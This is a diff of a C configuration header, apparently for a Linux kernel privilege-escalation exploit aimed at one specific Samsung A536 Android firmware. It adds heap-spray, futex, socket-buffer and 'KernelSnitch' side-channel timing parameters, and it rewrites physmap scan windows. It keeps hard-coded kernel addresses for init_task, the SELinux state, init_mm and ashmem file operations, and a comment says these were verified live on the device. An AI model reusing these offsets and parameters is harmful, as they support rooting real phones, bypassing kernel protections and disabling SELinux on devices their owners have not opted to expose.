@@ -6,10 +6,7 @@
 #define TARGET_KERNEL_RELEASE \
     "5.10.237-android12-9-31999025-abA536EXXSNGZG3"
 
-#define TRACE_EVENT_ID 104
-#define MM_PAGE_ALLOC_ID 260
-#define KMEM_CACHE_ALLOC_ID 253
-
+#define PAGE_SIZE 4096
 #define MAX_PHYSICAL_SLIDE 0x3f00000ULL
 #define PHYSICAL_SLIDE_ALIGNMENT 0x8000ULL
 #define PHYS_OFFSET 0x80000000ULL
@@ -23,6 +20,20 @@
 #define INIT_MM_IMAGE 0xffffffc009f64f38ULL
 #define MM_PGD_OFF 0x48ULL
 
+#define MM_STRUCT_SZ 0x3c0
+#define MM_ORDER 3
+#define MM_PARTIALS 5
+#define APPENDED_FUTEXES 2048
+#define REPEAT_MEASUREMENT 64
+#define AVERAGE 8
+#define KERNELSNITCH_BASELINE_SAMPLES 8
+#define KERNELSNITCH_BASELINE_QUANTILE 1
+#define A536_PAGE_SCAN_MAX 256
+#define A536_DMA32_SKIP_SLABS 8
+#define A536_TRIGGER_SLABS 24
+#define A536_SKB_SENDS 256
+#define A536_SKB_SNDBUF 8388608
+
 /*
  * KernelSnitch identity scan windows.  DEVICE-SPECIFIC: derive them once
  * per firmware (PTE-walk / oracle on a rooted unit; the linear map does not
@@ -31,16 +42,12 @@
  * Verified live on A536EXXSNGZG3: low physmap 2GB, high physmap measured
  * ~1.5GB; the 2GB high window is kept for margin.
  */
-#define KERNELSNITCH_IDENTITY_WINDOWS \
-    "0xffffff8000000000-0xffffff8080000000," \
-    "0xffffff8800000000-0xffffff8980000000"
+#define KERNELSNITCH_IDENTITY_WINDOWS { \
+    { MM_DMA32_ALIAS_START, MM_DMA32_ALIAS_END }, \
+    { MM_NORMAL_ALIAS_START, MM_NORMAL_ALIAS_END }, \
+}
 
-#define TRACE_CALLER_WORKER_BASE 0xffffffc0080fe2f8ULL
-#define TRACE_CALLER_VFORK_BASE 0xffffffc0080cfb34ULL
 #define INIT_TASK_BASE 0xffffff8001e0dd00ULL
-#define UID_LOCK_ALIAS 0xffffff8002286e18ULL
-#define BOOTID_TARGET_BASE 0xffffff8002282108ULL
-#define PERF_TARGET_BASE 0xffffff8001dfa4f8ULL
 #define SELINUX_STATE_ALIAS 0xffffff80021ddb68ULL
 #define ASHMEM_MISC_FOPS_ALIAS 0xffffff8001ffbc20ULL
 #define ASHMEM_FOPS_IMAGE 0xffffffc009b06f18ULL
